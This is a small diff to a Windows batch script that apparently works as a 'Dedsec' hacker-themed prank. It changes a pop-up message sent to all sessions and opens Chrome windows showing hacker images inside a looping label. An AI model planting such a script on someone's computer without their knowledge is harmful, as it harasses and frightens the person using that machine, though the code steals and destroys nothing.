@@ -1,6 +1,6 @@
 :loop2
 REM Showing DEDSEC
-msg * Dedsec 
+msg * We are Dedsec 
 
 start chrome --app=https://i.ytimg.com/vi/tudBj-89NHU/maxresdefault.jpg
 start chrome --app=https://pbs.twimg.com/profile_images/799694625153937408/etRAebbW.jpg
